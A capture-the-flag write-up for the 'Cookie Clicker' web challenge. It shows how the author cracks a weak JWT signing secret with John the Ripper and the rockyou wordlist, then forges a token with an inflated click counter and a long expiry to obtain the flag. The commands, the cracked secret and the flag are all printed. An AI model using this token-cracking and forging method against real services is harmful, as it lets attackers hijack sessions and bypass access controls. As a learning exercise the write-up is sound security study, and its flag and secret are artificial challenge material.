# Cookie Clicker
Web, 25 points

## Description
> Cookies are yummy, Can you help me **rock** this cookie ?

## Solution

We enter the attached website and are presented with a login page containing just a username field. Proceeding as `admin`, we are presented with the following page:

```html
<div class="columns is-centered">
    <div class="column is-two-fifths-desktop is-two-fifths-tablet">
    <form action="/" method="post">
        <div class="field">
        <div class="control">
            <button class="button is-fullwidth is-dark">1000000 Clicks left to retrieve the flag</button>
        </div>
        </div>
    </form>
    </div>
</div>
<div class="field is-grouped" style="justify-content:center;">
    <div class="control">
    <div class="tags has-addons"><span class="tag is-light">Powered by</span><span class="tag is-dark">JWT</span></div>
    </div>
    <div class="control">
    <div class="tags has-addons"><a class="tag is-danger" href="/signout">Sign Out</a><span class="tag is-light">admin</span></div>
    </div>
</div>      
```

If we click the button, we arrive to a page requiring 999,999 clicks and so on. After a while, our session times out and we need to start from 1,000,000 again. Clearly, this is not the way to go.

Notice that the website is powered by JWT. Let's inspect the cookie set by the server:
```console
root@kali:/media/sf_CTFs/kaf/Cookie_Clicker# curl -s http://ctf.kaf.sh:3020/signin -X POST -d "username=admin" -v
*   Trying 34.89.220.233...
* TCP_NODELAY set
* Expire in 200 ms for 4 (transfer 0x55c9fa3e9d10)
* Connected to ctf.kaf.sh (34.89.220.233) port 3020 (#0)
> POST /signin HTTP/1.1
> Host: ctf.kaf.sh:3020
> User-Agent: curl/7.64.0
> Accept: */*
> Content-Length: 14
> Content-Type: application/x-www-form-urlencoded
>
* upload completely sent off: 14 out of 14 bytes
< HTTP/1.1 302 Found
< X-Powered-By: Express
< Set-Cookie: jwtToken=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiY2xpY2tDb3VudGVyIjowLCJpYXQiOjE1NzY4NzE1NTIsImV4cCI6MTU3Njg3MTU4Mn0.vfxGfTOQfgtGr_nf5SHTnY0gT9khrtnVAvxHzb1F_tA; Path=/
< Location: /
< Vary: Accept
< Content-Type: text/plain; charset=utf-8
< Content-Length: 23
< Date: Fri, 20 Dec 2019 19:52:32 GMT
< Connection: keep-alive
<
* Connection #0 to host ctf.kaf.sh left intact
```

Using [this](https://jwt.io/) website, we can view the token's contents:
```javascript
{
  "username": "admin",
  "clickCounter": 0,
  "iat": 1576871552,
  "exp": 1576871582
}
```

We can try to crack it using the same technique used in the [JaWT Scratchpad](/2019_picoCTF/JaWT_Scratchpad.md) picoCTF challenge.

First, we convert the cookie to a format that [John the Ripper](https://www.openwall.com/john/) can understand:
```console
root@kali:/media/sf_CTFs/kaf/Cookie_Clicker# python ../../pico/JaWT_Scratchpad/jwt2john.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiY2xpY2tDb3VudGVyIjowLCJpYXQiOjE1NzY4NzE1NTIsImV4cCI6MTU3Njg3MTU4Mn0.vfxGfTOQfgtGr_nf5SHTnY0gT9khrtnVAvxHzb1F_tA > jwt.john
```

Then, we use `john` to perform a dictionary attack in an attempt to crack the password for the token. We'll use the `rockyou.txt` dictionary since that's what's hinted in the challenge description:
```console
root@kali:/media/sf_CTFs/kaf/Cookie_Clicker# ~/utils/john/run/john jwt.john  --wordlist=/root/utils/dictionaries/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (HMAC-SHA256 [password is key, SHA256 256/256 AVX2 8x])
Warning: OpenMP is disabled; a non-OpenMP build may be faster
Press 'q' or Ctrl-C to abort, almost any other key for status
mypinkipod       (?)
1g 0:00:00:01 DONE (2019-12-20 21:56) 0.8547g/s 1249Kp/s 1249Kc/s 1249KC/s mysheba..mypassone1
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

Using the recovered password (`mypinkipod`), we can modify the values in the token and resign it:
```javascript
{
  "username": "admin",
  "clickCounter": 1000000,
  "iat": 1577216031,
  "exp": 2577216061
}
```

Using the new token, we receive the flag:

```console
root@kali:/media/sf_CTFs/kaf/Cookie_Clicker# curl 'http://ctf.kaf.sh:3020/' -H 'Content-Type: application/x-www-form-urlencoded'  -H 'Cookie: jwtToken=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiY2xpY2tDb3VudGVyIjoxMDAwMDAwLCJpYXQiOjE1NzcyMTYwMzEsImV4cCI6MjU3NzIxNjA2MX0.ehYIgk8OioFY6e1PqJzJsf6iZQ-dp2SImAPNx8LHSZU' --data '' -L -s | grep KAF
            <div class="tags has-addons"><a class="tag is-danger" href="/signout">Sign Out</a><span class="tag is-light">KAF{koOK1E5_4rE_yUmmY_91Ve_mE_mOre}</span></div>
```